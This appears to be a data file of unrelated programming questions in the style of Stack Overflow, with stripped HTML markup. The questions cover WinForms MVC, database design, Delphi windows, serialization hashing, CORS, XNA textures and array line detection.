Negative 139 pIm using the MVC pattern in a .NET winform app.  There are places in the Controller that can cause an exception.  Rather than catching the exception and dislpaying a messagebox, which is a View responsibility, I do nothing in the Controller and let the View wrap that area in a trycatch.  So far, there isnt anything that needs to be done in these exceptions except display a nice message to the user.  That wont always be the case.  The View than displays the exception error in a messagebox.   I dont like this because the Exception classes come from the model.  So, the View is reaching directly into the Model to gain access to the exceptions.  But, how else can it be done and still follow the MVC patternp  pI could have the Controller handle the exception and throw a string back to the UI.  How is that done though  If functionA returns void, I dont want to modify its return type just to appaise the View.p

Negative 139 pIm building a C expression tree to evaluate simple expressions. The expression strings are parsed into trees, and respect the basic operators mathematical, logical and relational as well as precedence through the use of parantheses.p  pIn addition to the types bool, string and integer  I require some of the elements of the expression to be evaluated at runtime. These are represented by templated strings, for examplep  precode[firstname]  bob ampamp [surname]  builder codepre  pThe above expression would be evaluated for a potentially large number of objects that provide the context for the current expression invocation, for example, in a loop. The templated section would be used reflectively on the current context  e.g. the current users firstname and surname would be resolved in the example and those values used in the expression resolution rather than the templated strings.p  pOne solution would be to resolve the templated value at parse time, that way a constant expression type could be used and the type of the value would be known. However, rebuilding and recompiling the expression tree each use would have bad for performance.p  pSo, I need an expression type whose  value type is not known at parse time, and  which is resolved by a method call at invoke timep  precodeE.g.

Negative 139 pI have been struggling with a following problem. I have an ASP.NET application that has a certain search engine. It is possible to perform the searching by using prepared links. So I have a MS Word document that contains the links. When I click such a link a new IE8 window is opened, an ASP.NET session is spawned, the searching is performed and some results are displayed in the browser and stored in the session. Now when I send a new request by clicking something in the newly opened page a new session is spawned once again, thus the previously stored results are inaccessible. I would appreciate any suggestions how to handle this.p  pBest regards, B.p

Negative 139 pThis is probably a long shot, but I have vague sense I ran across this many years ago so Im hoping someone can help.p  pI have a static image in a Crystal Report page header that acts as a letter head. Everything looks fine in the designer, but at runtime the image displays a black line along the bottom of the image. Kind of like a border, but the line is only about a third of the width of the image and aligned to the right.p  pBorders for the image are set to none. I also set the image border color and background color to white. The original image was slightly large, so I resized it in Photoshop to fit the page width, thinking maybe the line was an artifact of Crystal resizing it. No joy. The image is a Jpeg but Ive also tried PNG and bitmap.p  pThe other compounding problem is I cant test the report directly on my development machine due to database connectivity issues, so the only way to test is to copy the report file to the users machine and run it there. Additionally, the user doesnt have Crystal itself but a viewer application my predecessor wrote many years ago. So I wonder if the problem is the users machine or settings.p

Negative 139 pTo make a long story short, one part of the application Im working on needs to store a somewhat large volume of data in a database, for another part of the application to pick up later on. Normally this would be lt 2000 rows, but can occasionally exceed 300,000 rows. The data needs to be temporarily stored and can be deleted afterwards.p  pIve been playing around with various ideas and one thing came to mind today. The codeLONGTEXTcode datatype can store a maximum of 232 bytes, which equates to 4 GB. Now, thats a lot of stuff to cram into one table row. Mind you, the data would probably not exceed strong6080 MBstrong at the very most. But my question is, is it a good idea to actually do thatp  pThe two solutions Im currently toying with using are something like thisp  ul liInserting all data as individual rows into a temporary table that would be truncated after finish.li liInserting all data as a serialized string into a codeLONGTEXTcode column in a row that would be deleted after finish.li ul  pPurely from a performance perspective, would it be better to store the data as potentially 300,000 individual rows, or as a 60 MB codeLONGTEXTcode entryp  pIf its a wash, I will probably go with the codeLONGTEXTcode option, as it would make the part of the application that picks up the data easier to write. It would also tie in better with yet another part, which would increase the overall performance of the application.p  pI would appreciate any thoughts on this.p

Negative 139 pI have been asked to setup VisualSVN for Visual Studio 2008.p  pDue to firewall restrictions and server configuration.

As soon as I connect to the ssh gateway and enter the password it closes again. So I cant use it to create the initial connection.p  pIf I use plink instead of tortoiseplink in VisualSVN then I never get prompted for the password.

Negative 139 pHow do you manage your sql server database builddeploymigrate for visual studio projects p  pWe have a product that includes a reasonable database part 100 tables, 500 procsfunctionsviews, so we need to be able to deploy new databases of the current version as well as upgrade older databases up to the current version. Currently we maintain separate scripts for creation of new databases and migration between versions.

Ive done this before with code that was straight C, but seem to have found that its not directly possible with C classes.

Negative 139 pI have a catch 22 situation here with the google analytics tracking code. I have a form that upon submission submits data to an api.

Negative 139 pIm developing an app for iPhone iOS 4.2 which needs to be able to collect large amounts of data from the accelerometer and gyroscope. Im current looking at using the CoreMotion framework to get the data into an acceptor class from which Im writing it to a database.p  pHowever, for code quality I want to write some test cases to test my acceptor class. Through research there doesnt seem to be any clear way to do this  CoreMotion just outputs data as floats, but I dont just want to feed a load of floats into the acceptor class, because that wont replicate how CoreMotion behaves  rather just how a feed of floats will.p  pIs it fair to assume that as CoreMotion is an appleproduced class when they say it will produce data at xhertz, and this data will be between the range of y and z that this is a given p  pAny ideashints relating to writing and developing test cases, and additionally relating to my overall design would be greatly appreciated.p
Negative 139 pI am in desperate need of either algorithm or  query construction assistance.p  pWe have a usergenerated, flexible database that is created using a form builder we have created.  The data for these forms is stored in two tables as follows img srchttpi.stack.imgur.comX0QeX.png altenter image description herep  pThe instances table tell us what form the user is viewing, and then the instancerecords table has all the data for the instance.  The fieldid column tells us what field on the form the data maps to.  The reason we use a single table like this instead of creating a table for each form is that MySQL limits how many columns we can have in table given that the data is varchar of a significant length.  One possibility would be to use Text fields for the data, but then we would lose the built in MySQL searching capabilities.p  pThings work quite well and very fast on basic forms.  The problem is that one instance of a form can refer to another instance of the form.  For example, we have user created form called Appointments.  On this form, it refers to the Patient form, the Technician form, the Doctor form, etc.p  pSo, on the Appointment form with instance id, the value for the patient field is actually an instance id of a patient, the doctor field value is the instance id for the doctor, etc.  At the first level of references, things arent too bad.  But, you can have chains of references.  I can have a prescription that refers to an appointment that refers to a patient, etc.  So, if I want to get the value of the patient name on the prescription, I have to follow the chain down to get the right instance id and field id for the data.p  pSo, if I want to do a report on Appointments and show the Patient name, the Doctor name, and the Technician name, I have to go through some hoops.  What I have tried is creating views and then joining the views to a final view that shows all the data for the query.  But, it eats a ton of memory and starts writing the view temporary tables to disk and gets slow as all heck.  Using query caching, the second time the report runs, its fast as heck.  But, that first run can take over a minute once we get above 50007000 instances.  p  pSomething tickling at the back of my mind is that there might be some sort of a way to store the data in a way that I can take advantage of some faster tree search algorithms.  p

Negative 139 pI need to create a data structure that can access elements by a string key, or by their ordinal.p  pthe class currently uses an array of nodes that contain the string key and a pointer to whatever element. This allows for On looping through, or O1 getting an element by ordinal, however the only way Ive found to find an element by key is doing an On loop and comparing keys until I find what I want, which is SLOW when there are 1000 elements. is there a way to use the key to reference the pointer, or am I out of luckp  pEDIT the by ordinal is not so much important as the On looping. This is going to be used as a base structure that will be inherited for use in other ways, for instance, if it was a structure of draw able objects, id want to be able to draw all of them in a single loopp

Negative 139 pThe gist of itp  pIm creating an effect using jQuery where a succession of divs show up, and each div animates the typing of some text  which is really just me resetting the jQuery .html value to a text substring of incrementally increasing length very many times using Javascripts setTimeout.p  pEvery once in a while the typing animation stalls partway through the text, and just hangs there until the text theoretically would have finished typing  at which point it shows the full text.  The stalls occur consistently in the same places in Chrome, Firefox, and Safari and on different computers.  The WEIRD part is that although I can see it stalling, while debugging I can still see the div text typing correctly in the DOM tree.p  pI also allow the user to click to skip to the next div.  The stalling issue only occurs after Ive fired this click callback.p  pAnyone got any idea  Im pretty stumped here.  Unfortunately I cant post any code, but I can give pseudocode if that would help.p
Negative 139 pI have the following issue were building a rather large application win32, Delphi 6 Enterprise. In several part of the application, modal windows are used, usually containing the detail of the selection of the main window.p  pWe included a modification of the handling of the WMSYSCOMMAND messages so that, if the window is modal, then a SWSHOWMINNOACTIVE message will be sent to the applications main window. This causes the whole application to be minimized instead of just the modal form.p  pThere is, however, an issue happening in a specific case if the calling window is set to full screen, then upon restoration, the modal window will appear UNDER the disabled maximized main window this seems to happen on Windows 7p  pMy problem is two fold p  pFirst, I dont seem to get any syscommand message when the application is restored any more so I cannot introduce code to restore the ZOrder because I dont know where to put it. Second, it seems to me that, if the whole application is minimized, clicking on the apps button in the task bar should restore it in the same state, not with a modal window under it. Is there a way to fix that p  pEdit we did some additional testing and it seems we can actually detect the problem in the WMACTIVATE handler for the main form. We can also identify the modal window at that stage. I cannot, however, find a way to restore it to the top of the ZOrder.p  pEdit2 here is the code that minimizes the application when the modal form is minimizedp  precodeprocedure TfmGITForm.WMSysCommandvar Message TWMSysCommand begin   if fsModal in FormState or       not Application.MainForm.Visible then   begin     case Message.CmdType of       SCMINIMIZE       begin         ShowWindowApplication.Handle, SWSHOWMINNOACTIVE       end       SCRESTORE       begin         ShowWindowApplication.Handle, SWSHOWNORMAL         inherited       end     else       inherited     end     case   end   else     inherited end codepre  pAll our forms descend from that one.p

Negative 139 pThis is what I have to do p  pTo build a CADlike application that loads a point cloud i.e. thousands of 3D points representing a 3D object from file, allows the users to manipulate the points i.e. change the shape by moving the points, do a lot of calculations the points on the points e.g. finding the intersection points between lines and surfaces, detect a point is above or under a surface etc., measure the distances between points, or points to surface etc., and then save the modified points to file.p  pIt also provides basic CADlike UI features such as zoom inout, pan the view, rotation the camera etc.p  pSpeed is the major concern.p  pInstead of writing my own functions for matrix operation and defining my own pointlinesurface classes, I would like to use existing librariesAPIs to do the job.p  pI know WPF, XNA and SlimDX provides the API to do 3D geometric calculations and all of them are finally calling DirectX, but Im just newbie to all of them.

Most of the time I will only draw the final result to the screen and the drawing is mainly lines and points, the speed of drawing is not a big concern . so it is not really a graphicintensive app, but a geometriccalculationintensive app. p  pAfter reading the answer and comments, I think of two options p  ol lipstore amp calculate the data with primitive datatypes, and convert data to the WPFXNASlimDX data structures when drawing them on screen, or pli lipuse these APIs data structures to store, calculation and drawing all those points.pli ol  pwhich one is betterp

I want to allow to import and export data in xml string, but internally store them in a set of objects and be able to mobify these objects. So I want to have a codestringcode property, and I need to take the xml string and convert to my internal different data format, and then export it back to string when saving back to database.p  pThe current version is a standard property. Its connected to the pair of conversion methodsp  precodepublic string XmlData    get  return ExportToXML    set  ImportFromXMLvalue   codepre  pHow to convert this code to a dependency property in order to allow databindingp  pstrongUpdatestrongp  pAKAIF it is easy to implement the setter using the dependency propertys callback. But there is no callback supported for the getter.p

Negative 139 pI have seen several posts on this site, and on others, stating that the problem is usually caused by the order in which the tables are added to the Configuration of the SyncAgent on the client side, or the SyncAdapter on the provider side. I believe I have my ordering of the tables correctly in both these places I have an NTier architecture  a web service that is providing sync functionality.p  pDoes anyone know of any other potential cause for this behaviorp  pAlso Sycning works for all tables, except one. For some reason, that table is created on the client but, no records are transferred...even on the initial sync, when the database is created on the client. Any ideasp  pAny help would really be appreciated. getting this sync functionality to work, and then the data entities for the client to use based on the synced data, is turning into a life mission. Dont you just love working with massive Frameworksp  pThanks very much for whatever you can suggest. p  p[UPDATE I have found the problem that caused the records for one table to be omitted from the sync, while the records from all the other tables were synced. The InsertId column for the table in question was full of NULL values, and UniqueIdentifier data cant be compared to NULL. The other tables dont have an InsertId column, because they are for download only. Still, the main problem of no Foreign Key relationships persists]p

Negative 139 pIs there any way to have Subversion in Eclipse ignore a specific file.  Ive tried going to Team  Synchronize with Repository, and the Mark as Merged option isnt available.  I dont think its possible, but does anyone have any ideasp
Negative 139 pI have a scenario where I am synchronizing data between multiple VERY dissimilar systems. The data itself is similar but the tables on the different systems have quite different formats. To assist with this synchronization, I have a database table which stores object hashes from each of the systems along with item keys and other relevant information. When the hash of an object from either system changes, I update the other.p  pMy database table looks something like this.p  precodeCREATE TABLE [dbo].[SyncHashes]     [SyncHashId] [int] IDENTITY1,1 NOT NULL,     [ObjectName] [nvarchar]50 NULL,     [MappingTypeValue] [nvarchar]25 NULL,     [MappingDirectionValue] [nvarchar]25 NULL,     [SourceSystem] [nvarchar]50 NULL,     [SourceKey] [nvarchar]200 NULL,     [SourceHash] [nvarchar]50 NULL,     [TargetSystem] [nvarchar]50 NULL,     [TargetKey] [nvarchar]200 NULL,     [TargetHash] [nvarchar]50 NULL,     [UpdateNeededValue] [nvarchar]max NULL,     [CreatedOn] [datetime] NULL,     [ModifiedOn] [datetime] NULL,     [Version] [timestamp] NOT NULL,      [IsActive] [bit] NOT NULL, PRIMARY KEY CLUSTERED       [SyncHashId] ASC WITH PADINDEX   OFF, STATISTICSNORECOMPUTE   OFF, IGNOREDUPKEY  OFF, ALLOWROWLOCKS   ON, ALLOWPAGELOCKS   ON ON [PRIMARY]  ON [PRIMARY] codepre  pSo far so good. But...p  pIn order to effectively compute a hash such as an emMD5 hashem which is what i am using for an object, you need to be able to convert it to a embyte arrayem. p  pAnd...p  pIt seems that in order to convert an object to a byte array, it must be emserializableem. At least thats what I have read, and the errors I am getting from .NET seem to indicate that is true.p  pFor one of the systems, I have the ability to make all of my database objects serializable so thats great. Hashes get generated, everything gets synchronized, and the world is beautifulp  pFor another system, things are emnot so greatem. I am passed a emdatabase contextem from ementity framework 4em code first model and the entities are emNOT serializedem.p  pWhen I attempt to cast as byte using something like the following, .NET complains and throws a minor tantrumall the while refusing to give me the nice little byte array I so politely asked for.p  precodeforeachvar dataItem in context.TableName      var byteArray  byte[] dataItem  codepre  pOk. No problem.p  pI have myself a nice little extension method which I thought might do the trick.p  precodepublic static byte[] ObjectToByteArrayltTgtthis T obj      if obj  null         return null     BinaryFormatter bf  new BinaryFormatter     MemoryStream ms  new MemoryStream      bf.Serializems, obj     return ms.ToArray  codepre  pBut oh no If the object the Entity is not serializable, this routine throws me another nice little and totally expected exception.p  pSo... I modify the routine and add a where clause to the method definition like so.p  precodepublic static byte[] ObjectToByteArrayltTgtthis T obj where T  ISerializable      if obj  null         return null     BinaryFormatter bf  new BinaryFormatter     MemoryStream ms  new MemoryStream      bf.Serializems, obj     return ms.ToArray  codepre  pThe only problem is that now I am back to square one where all of my objects need to be serializable to get a byte array.p  pHmmm. Not good.p  pSo I put together a hack to iterate through all of the objects properties and generate a string representation from which I could build a byte array. It was UGLY and INEFFICIENT but it kind of sort of did the trick.p  precodepublic static string ComputeMD5HashltTgtthis T input      StringBuilder sb  new StringBuilder      Type t  input.GetType     PropertyInfo[] properties  t.GetProperties      foreach var property in properties              sb.Appendproperty.Name         sb.Append         object value  property.GetValueinput, null         if value  null                      sb.Appendvalue                  sb.Append           return MD5HashGenerator.GenerateKeysb.ToString  codepre  pBut...p  pAfter all that, what strongI still really would like to be able to is efficiently and properly to create a byte array from an object whose class is not marked as serializablestrong. What is the best way to accomplish thisp  pThank you in advancep

Negative 139 pIm wondering what peoples experiences have been converting projects from MRC manual reference counting to ARC automatic reference counting with regard to performance and memory usage.p  pIm interested primarily in mediumlarge projects and quantifiedprofiled results in multiple domains time, memory, etc, rather than small programs and sensed changes.p  pIve played around with it in small test cases, and I saw some interesting differences, but Ive certainly not migrated fullcomplex programs at this time.p  pIm also curious to hear how much effort you made to minimize memory usagereference count operations when the converted program was initially developed using MRC e.g., did you create autorelease pools in the right places did you favor autorelease on creation, or releasing in the following statement did you measure and improve memory usage often I ask because one developers approach from anothers can make a significant difference in the results.p  pCheersp

Negative 139 pIve got a bindable model class lets call it myModel with two properties, label and value. The value gets updated frequently, so it is marked as bindable. Works fine so far, the data is updated and the standard property change event is dispatched.p  pNow I have to make an ArrayCollection from the object instances of this model to use it as a data provider in a data group. The data gets then passed to a custom itemRenderer in which I access the myModel properties via data.label and data.value.p  pThe only problem Ive got now is that the myModel value property doesnt change any more I suppose because I stored the objects in the ArrayCollection. p  pThe ArrayCollection is marked bindable as well btw, because new object instances of myModel can be added during runtime. p  pIs there any way to make this work Any help regarding this would be much appreciatedp  pEdit I almost forgot, the value object in the myModel class is updated by another bindable class. Yes, I know thats bonkers but thats why Im here, to get some input on a simpler and in fact working way to solve this problem.p  p2nd edit Allright guys, a little bit of code to illustrate the issuep  pLets start with the first bindable classp  precode[Bindable] public class FirstClass     public var nameString    public var firstValueNumber    public var secondValueNumber    public var thirdValueNumber     public function FirstClass        codepre  pThe values first to third get updated by a controller class. So far so good. Now to the second model class for matters of consistency, lets keep the MyClass namep  precode[Bindable] public class MyClass     public var labelString    public var valueNumber     public function FirstClass        codepre  pThese are the two model classes. Background behind this is that I need a String value a label for each property of an instance of FirstClass. Id like to make this simpler, so Im really not settled on this solution emcoughem .p  pAnyhow, weve got the two models, now to my .mxml classp  precode[Bindable] private var firstClassInstanceFirstClass codepre  pI create a new ArrayCollection and add objects like this      myArrayCollection.addItemnew MyClassThis is a label, firstClassInstance.firstValuep  pAnd again, the DataGroup uses this ArrayCollection as a data provider.p  pAs we already established thank you Windowns, the ArrayCollection looks only for objects being added or removed, not property changes of these objects.p

Negative 139 pI have an application that is being deployed via a Visual Studio Setup Project, however, I had to create some custom Windows Forms to collect some specific data from the user. These forms are shown in the Install method of the applications Installer class, right after application files have been deployed by the Setup Project I.E. the MSI. The problem is that when my forms appear, they appear under the Setup Projects window rather than being the topmost form on the screen. The form then has to be focused on manually by clicking on its icon in the taskbar to bring it up, if the user even notices it. p

Negative 139 pI have a products table containing products. Each product can have multiple images. The urlsid of the images are to be stored in my database. Now, instead of creating columns such as codeimageurl1code, codeimageurl2code , etc. in my products table, is it good practice to store the serialized data containing the list of images in my products table in one column called codeimageurlcode.p  pOr is it better to create another codeproductimagecode relationship table and store the product ids and image idsurls therep  pAm sure both methods will work, but I want to go with the best practice.p  pNote The number of images per product will vary. Some products may not even have an image.p  pEdit To add more specific detail to my question. The image URLs will not be used for searching. It will be used just to retrieve the URL of the image when the product is being displayed.p

Negative 139 pId like to have a base class that has a constant field like an unique ID associated with the class that cant be modified after compile time. So far the codestatic constcode declaration would be just fine. Now, Id like to inherit this base class and make sure that the children of this class do have the same field, but with their own values. How can I do thisp  pLets say, Id like to have a base class called codeBasecode with an codeIDcode field that holds the codeintcode value of 0. Then, Id like to have the classes codeAcode, codeBcode and codeCcode, all of them being public children of codeBasecode and Id like to make sure that these children would also have the codeIDcode fields with the respective values of 1, 2 and 3 by making sure, I mean something like getting a compiler error if they dont have a ID explicitly declared.p  pIf I could manage to build this scenario, my expectation would be that asking for the codeIDcode field of a codeBasecode pointer, I should get different values depending whether the pointer was created as codenew Acode, codenew Bcode or codenew Ccode.p  pMy guess would be to declare codeIDcode as codevirtual static constcode, which of course doesnt make sense and gives a compiler error.p  pBut then what can I do to achieve the described result The only thing that I could imagine would be to declare codeIDcode as a virtual function returning an integer and then hardcode the value into the function body, but Im looking for something more elegant.p  pThank you in advancep

Negative 139 pIve got an application with two XAMLWPF windows derived from NavigationWindow, each window contains one parent UserControl, in which all child controls are placed. In one of the windows, Id like to show the second windows content really just the parent UserControl, in the manner like a pictureinpicture TV. In this way the user could view the first window, and see what is happening in the second window at the same time. Note, that I do not want two independent copies of this second windows UserControl that would be easy, but to mirror the content of the second window in the first window.p  pThis is vaguely similar to the Windows 7 Taskbar thumbnail previews, so I figure that it must be doable. Ideally, however, Id also like to be able to interact with that windowinawindow, in the same way as I would if I were to pull up the original window.p  pThis is similar to a hrefhttpstackoverflow.comquestions10131333screenshotofthemainwpfwindowundersecondmonitortv titlethis questionthis questiona, except that Id like just a single window from the same application to be copied, instead of the whole desktop. Also similar to a hrefhttpstackoverflow.comquestions8095636duplicateawindowinallscreensthis questiona, but I need a bit more handholding, as Im not superfamiliar with CWPF.

Negative 139 pI am just getting into XNA programming and have been unable to figure out how can I access the texture from a .x model.  I am using a custom shader to display my model just a cube with a texture mapped on it with the filters set to point. To do this I needed to pass the effect my texture file which needed to be imported separately from my model or else it would complain since it is included in my model as well.  This works perfectly how I want it, however this isnt really an agreeable method when I have many different models with their own textures.p  pstrongMy question isstrong p  pHow am I able to access the texture included in my model directly from it and send that to my shader Or am I able to access it directly with HLSL p  pstrongWhat I have triedstrongp  pI have found posts saying that it can assigned to a texture variable with p  pcodeTexture2d texture  BasicEffectmodel.Meshes[0].Effects[0].Texturecodep  pWhen I tried this the game runs but the cubes are just black.  I can see that the texture variable is holding info and has the right dimensions but I cant tell if it is correctly holding the actual image. When I used just the codeBasicEffectcode they rendered just fine with their texture.p  pstrongUpdatestrongp  pI have managed to get this to work after a little bit of fiddling. My game loads in a few hundred of the same cube and upon creation of each it would try save the texture of the model using the code above and then go through the mesh parts and change the effects to my custom effect. I discovered that the first cube created would save the texture okay but any subsequent cubes created would complain that they cant be cast as a BasicEffect. This resulted in one textured cube and then a lot of black ones. I am guessing that when it reuses the same model over and over like that it will just use the one that was modified to use my custom effect which was done on the first instance of the cube.  Is this normal  I have got them all to render as textured by changing the texture variable to static.p

Negative 139 pIm trying to make a partial plot with package randomForest in R. After I perform my random forest object I typep  precodepartialPlotdata.rforest, pred.dataact2, x.varcentroid, C  codepre  pwhere codedata.rforestcode is my randomforest object, codeact2code is the original dataset, codecentroidcode is one of the predictor and codeCcode is one of the classes in my response variable. Whatever predictor or response class I try I always get a plot with a straight line. Similarly, If I set a categorical variable as predictor, I get a barplot with all the bar with the same height.  I suppose Im doing something wrong here because all other analysis on the same rforest object seem correct e.g. codevarImpcode or codeMDSplotcode. Is it possible it is related to some option set in random forest objectp

Negative 139 pMy desire is a safe way to encode a given object to JSON.  This is for a logging any abstract object in Node.js but can apply to other needs as well.  My research pointed me to util.inspect in Node, but this isnt valid JSON, and my desire is to have valid JSON that I can rehydrate later.  Because some Error instances can have recursion issues, I needed to limit the response.  Also, in some cases forward and backreferences to objects can be an issue as well, so I want to avoid duplicate entries.p

Negative 139 pbest wishes for 2013p  pIm using SciPys weave inline with some C code of mine to transpose huge matrices about 200.000 x 15. It works like a charm, but I have a question about typecastingp  pMy input matrix is read from a file, comma separated etc., so all the entries are strings rather than floats 0.551 rather than 0.551.

Negative 139 pAn item that I am struggling with is when I attempt to take a screen capture of any portion of the GMSMapView Google Maps SDK iOS. The UIGraphicsGetImageFromCurrentImageContext UIImage output is invisible. I eventually discovered that the GMSMapView is rendered with OpenGL. Knowing this, I attempted to use the glReadPixels method. The troubling thing is that I am able to retrieve a map screen capture on the iPhone simulator just fine, but when I use the same method on a real device it is still invisible iOS 6. p  pIm wondering if anyone has run into the same issue Ive done my share of investigating. I could not find anything relevant to my situation. Most of the generic solutions I did find said that I should update a few of the CAEAGLLayer attributes. I assumed the GMSMapView would limit me from finding the appropriate layer, but I was able to find and update the CAEAGLLayer, as seen belowp  precode[CAEAGLLayer [[[mapView subviews] objectAtIndex0] layer] setOpaque NO]  [CAEAGLLayer [[[mapView subviews] objectAtIndex0] layer] setDrawableProperties[NSDictionary dictionaryWithObjectsAndKeys [NSNumber numberWithBoolYES],kEAGLDrawablePropertyRetainedBacking,kEAGLColorFormatRGBA8, kEAGLDrawablePropertyColorFormat,nil]] codepre  pForums recommended that by setting the layers OPAQUE attribute to NO and the retained backing property to YES it would alleviate the iOS 6 issue. It did fix it on the simulator, but not the device. p  pThe last fix I stumbled across said to update the main OpenGL views preserveBackBuffer to YES. This is where my technical expertise ended. I have not been able to find where or how to update the GMSMapViews preserveBackBuffer value. Im assuming this is the fix that will remedy all of my screen capture issues. Seems to be solely an issue with devices running iOS 6. p  pDoes anyone have a tested workaround for this issuep

Negative 139 pIm working on a Ruby on Rails app that relies on my app making some simple URL calls for user metrics. For part of the tracking I need to make a serverside call prior to the rendering of my index page. This is achieved by calling a specially formatted URL. Currently Im achieving this in the following wayp  precodeurl  URI.parsehttpsexample.tracking.url result  NetHTTP.starturl.host, usessl true, verifymode OpenSSLSSLVERIFYNONE do   http http.get url.requesturi, UserAgent gt MyLib v1.2        end codepre  pThe loading of my page seems to be, at times, somewhat delayed. Short of it being a Database latency issue I assume its just that sometimes the URL takes a extra time to respond and that this is a synchronous request. What is the best way to make asynchronous requests in Rails, Threads maybe Thanks.p
Negative 139 pIm trying to run a formula in excel that receives a range of cells and performs an action on them. The thing is, I would like to pass a range of cells, as well as another cell that is not in the range.p  pDo you know a way of doing sop  pBefore you suggest, Ill say that, unfortunately, the formula doesnt work like SUM, meaning, it doesnt have endless fields to enter separate values. It has one field for a range of values to which I want to have a range and another separate cell, and after a comma, another, different, value should come meaning, I can give it the range, comma, the other value.p  pThanks guysp

Negative 139 pThis isnt directly a programming question but it does use a bit of maths and css and its been bugging me for a while now.p  pMy aim is to create an angled logo image with a logo rotated, say, 35 deg and make it so it can be tiled. I have referred to a hrefhttpstackoverflow.comquestions11633444creatingseamlessrotatedbackgroundimagethis well thought out questiona but I am currently a bit stuck at stage 1.p  pSo say this is my logop  pimg srchttpi.stack.imgur.com3O9Wp.png altenter image description herep  pIts not so regular in that it has a little icon on the topleft and it isnt set inside a set size rectangle so its boundaries are not obvious.p  pThe first step, I guess, is to make it tileable in its current form. Just applying a css tile rule to it as it stands would result in something like this, which is no goodp  pimg srchttpi.stack.imgur.combnKuK.jpg altenter image description herep  pIdeally, before we rotate it we want alternate rows to be offset so its less emgridlikeem.p  pimg srchttpi.stack.imgur.comfLLb0.jpg altenter image description herep  pThe offset should obviously be 50 of the space between the same point on 2 adjoining logos. What is the best way to achieve this step Do I just copypaste and drag it until it looks right This wont be that accurate. Using photoshop.p  pIll then need to determine the crop area so it seamlessly repeats.p  pOnce this is done I have a grid of images that I can now rotate as one in photoshop to my desired angle. The difficulty will be getting the crop area correct. I will then refer to my link above.p  pThe added difficulty is ensuring we have a good sized crop area for the horizontal logos. If the ratio of the edges means we have a very high a hrefhttpen.wikipedia.orgwikiLeastcommonmultiple relnofollowleast common multiplea then my rotated crop area will be huge and pointless.p  pIn summary, what is the best method to reliably set the horizontal grid so we get a crop area with sensible dimensions e.g. 150 x 100 pxp

Negative 139 pA very good article When Runtime.exec wont says The only possible time you would use exitValue instead of waitFor would be when you dont want your program to block waiting on an external process that may never complete. Instead of using the waitFor method, I would prefer passing a boolean parameter called waitFor into the exitValue method to determine whether or not the current thread should wait. A boolean would be more beneficial because exitValue is a more appropriate name for this method, and it isnt necessary for two methods to perform the same function under different conditions. Such simple condition discrimination is the domain of an input parameter.p  pI have exactly same situation where my system call would start a process which will keep running until user decides to kill it. If I use process.waitFor  0 it will block program there because process will not be completed. Author in article above suggest that exitValue can be used with waitFor parameter.

Negative 139 pIn order to provide a custom typeface in my codeListActivitycode, I wrote a class codeCustomAdaptercode extending codeBaseAdaptercode according to this example a hrefhttpstackoverflow.comquestions4576441customfontinandroidlistviewherea.p  pHowever, as described there, I wrote the codegetViewcode method like followingp  precodepublic View getViewint position, View convertView, ViewGroup parent     String gameName  gameNames[position]  gameName ist the String[] of the Custom Adapter      TextView tv  new TextViewcontext     tv.setTextgameName     tv.setTypefaceTypeface.createFromAssetcontext.getAssets, fontsgulim.ttf      return tv  codepre  pThis works as intended. The only disturbing thing is that it takes about three or four seconds until the list shows up and this is a very long time in this context. However, in the codeListActivitycode I set the codeonItemClickListenercodes like thisp  precodeprivate void setOnItemClickListener     getListView.setOnItemClickListenernew OnItemClickListener          public void onItemClickAdapterViewltgt parent, View view, int pos, long id             onClickEntryButtonTextView view.getText.toString                 private void onClickEntryButtonString gameName     Intent intent  new Intentthis, GameActivity.class     intent.putExtragameName, gameName     startActivityintent     finish  codepre  pNow when clicking on a codeListItemcode, it takes even more time until the codeGameActivitycode opens. This codeActivitycode is just a couple of codeTextViewcodes filled with information taken from a SQLite database. Also here, I set a custom typeface to every codeTextViewcode. It happens even that the screen gets black for 23 seconds appearing the app crashed, then the new codeActivitycode shows up. This doesnt happen accessing that codeActivitycode from other places in the application.p  pIn both cases  accessing the codeListActivitycode and accessing the codeGameActivitycode from the codeListActivitycode  a couple of p  blockquote   pszipinf  Initializing inflate statep blockquote  pmessages appear in the LogCat.

So please bear with me and help me outp  pMy understanding is that Same Origin is a PITB for web services, and in response CORS loosens the restrictions just enough to make web services work reasonably, yet still provides decent security to the user. My question is exactly how does CORS do thisp  pSuppose the user visits website A, which provides code that makes web service requests to website Z. But Ive broken into and subverted website Z, and made it into an attack site. I quickly made it respond positively to all CORS requests header add AccessControlAllowOrigin . Soon the users computer is subverted by my attack from Z. p  pIt seems to me the user never visited Z directly, knows nothing about Zs existence, and never approved Z. And it seems to me even after the breakin becomes known theres emnothingem website A can do to stop it short of going offline itself. Wouldnt security concerns mandate A certifying Z, rather than Z certifying A What am I missingp

The php script uses p  precodeweek  dateW, strtotimedate codepre  pto get a weeknumber with leading zeros. thats not in the spec, but that is what I get.

Negative 139 pSo I have a 2D array of 1 and 0 values, a value is either on or off, this can generate shapes and I want to check for vertical lines, for examplep  precode[0,0,1,0,1,0,0,0] [0,0,0,0,1,0,0,0] [0,1,0,0,1,0,0,0] [0,0,0,0,1,0,0,0] [1,0,0,0,1,0,0,0] [0,0,0,0,1,0,0,0] codepre  pthat has a vertical line in column 5 so we will return those ones and strip all other results change the 1s that arent part of that line to 0s...p  precode[0,0,0,0,1,0,0,0] [0,0,0,0,1,0,0,0] [0,0,0,0,1,0,0,0] [0,0,0,0,1,0,0,0] [0,0,0,0,1,0,0,0] [0,0,0,0,1,0,0,0] codepre  pMy 2 dimensional array is much more complex, it is about a 300x600 2D array.

This is what the returned image was the blue arrow was later photoshopped in to indicate the longest vertical line the values we want to keepp  pimg srchttpi.stack.imgur.commtixT.png altenter image description herep  pSo whats a good method to find the longest vertical line of 1 values in a 2 dimensional array and change all other values to zero. So that if I render the array in a visual graph format again only this is displayed other red dots are fading out because they have been changed from 1 values to 0 values.p  pimg srchttpi.stack.imgur.comUvXhn.jpg altenter image description herep  pI was thinking maybe something along the lines of generating a forloop that would keep track of all of the 1 values in each column and a set of maybe any given 6 columns that are consecutively next to each other that have the largest amount of 1 values is the area 6 columns wide where the longest vertical line is most likely located, but I can see a few issues with this, also I dont know how to get the rows that are part of that line after I have the columns.... hmmmmp  pbrbrhrbrbrNote I am making my 2 dimensional array by just have a variable for the fixed number of columns and then I have an array that just has all of the values for all columnrow combinations. For example a 3x3 board would be code[0,0,0,0,1,0,0,0,0]code which I can then understand means thisp  precode[0,0,0] [0,1,0] [0,0,0] codepre  pBecause I know there is always 3 columns per row. br code[row1column1,row1column2,row1column3,row2column1,row2column2,row2column3,row3column1,row3column2,row3column3]codep

